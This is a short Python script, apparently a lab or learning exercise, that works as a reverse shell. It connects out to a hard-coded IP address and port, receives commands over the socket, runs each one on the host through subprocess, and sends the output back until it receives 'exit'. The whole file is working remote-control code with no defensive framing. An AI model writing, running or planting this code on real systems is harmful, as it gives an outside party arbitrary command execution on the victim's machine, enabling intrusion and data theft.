import socket
import subprocess #library that uses python to interact with the system os

server_ip = '172.17.85.168' #using my ip
server_port = 9999 
target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target_socket.connect((server_ip, server_port))
while True:
    command = target_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    target_socket.send(output.encode())
target_socket.close()
